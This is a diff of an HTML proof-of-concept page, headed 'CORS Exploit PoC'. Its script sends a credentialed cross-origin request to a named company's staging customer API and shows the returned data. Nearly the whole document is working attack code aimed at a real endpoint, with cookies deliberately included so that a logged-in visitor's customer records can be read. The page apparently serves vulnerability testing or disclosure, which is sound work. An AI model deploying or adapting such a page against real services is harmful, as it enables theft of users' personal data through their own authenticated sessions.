@@ -2,36 +2,29 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>CORS PoC</title>
+</head>
+<body>
+    <h2>CORS Exploit PoC</h2>
+    <button onclick="sendRequest()">Send CORS Request</button>
+    <pre id="response"></pre>
+
     <script>
-        function makeCorsRequest() {
-            var xhttp = new XMLHttpRequest();
-            // Change this URL to the vulnerable API endpoint
-            var url = "https://api.staging.my.zalora.net/v1/customers";
-
-            xhttp.open("GET", url, true);
-            xhttp.withCredentials = true; // Important for sending cookies
-
-            xhttp.onload = function () {
-                if (xhttp.status >= 200 && xhttp.status < 300) {
-                    document.getElementById("response").textContent = "Response: " + xhttp.responseText;
-                } else {
-                    document.getElementById("response").textContent = "Request failed with status: " + xhttp.status;
+        function sendRequest() {
+            const xhttp = new XMLHttpRequest();
+            xhttp.withCredentials = true;  // Enables cookies/auth headers to be sent
+            xhttp.open("GET", "https://api.staging.my.zalora.net/v1/customers/", true);
+            
+            xhttp.onreadystatechange = function() {
+                if (xhttp.readyState === 4) {
+                    document.getElementById("response").textContent = 
+                        xhttp.status === 200 ? xhttp.responseText : "Request failed: " + xhttp.status;
                 }
             };
-
-            xhttp.onerror = function () {
-                document.getElementById("response").textContent = "Request failed";
-            };
-
+            
+            xhttp.setRequestHeader("Content-Language", "en-MY");
             xhttp.send();
         }
     </script>
-</head>
-<body>
-    <h1>CORS PoC</h1>
-    <button onclick="makeCorsRequest()">Make CORS Request</button>
-    <pre id="response"></pre>
 </body>
 </html>
